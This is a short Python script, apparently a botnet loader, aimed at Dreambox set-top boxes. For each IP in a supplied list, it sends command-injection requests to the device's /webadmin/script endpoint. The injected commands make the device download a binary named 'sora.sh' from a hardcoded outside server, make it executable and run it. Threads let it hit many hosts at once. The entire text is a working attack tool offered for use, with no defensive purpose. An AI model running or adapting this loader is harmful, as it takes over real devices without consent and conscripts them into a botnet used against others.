#! python !#
import threading, sys, time, requests
	
ips = open(sys.argv[1], "r").readlines()
#Ry RDM/ snoopy wyn Dreambox loader 
#@https://www.youtube.com/c/snoopyy
ServerIp = "37.0.10.182" #your server ip i like dogs
binName = "sora.sh" #yakuza.sh be Likke HEHEHEHE A WISE MEN ONCE SAID O YEHJH MATE IMA KILL YA BINS YAHHEH
#[PORT OF EXPLOIT]
Port = "21"#ports  for use : 10000, 8889, 8081, 8880
#loader tested and works interface of running wget and sh 
class Sno(threading.Thread):
		def __init__ (self, ip):
			threading.Thread.__init__(self)
			self.ip = str(ip).rstrip('\n')
		def run(self):
			try:
				print "\x1b[0m[\x1b[38;5;196mDreambox\x1b[0m]:" + self.ip
				url = "http://" + self.ip + ":"+Port+"/webadmin/script?command=| wget http://"+ServerIp+"/"+binName+"" #grab bin no fucking shit
				run = "http://" + self.ip + ":"+Port+"/webadmin/script?command=| chmod 777 "+binName+"; sh "+binName+"" #run bin no fucking shit                
				requests.get(url, timeout=3)
				requests.get(run, timeout=3)
			except Exception as e:
				pass
for ip in ips:
	try:
		s = Sno(ip)
		s.start()
		time.sleep(0.03)
	except:
		pass
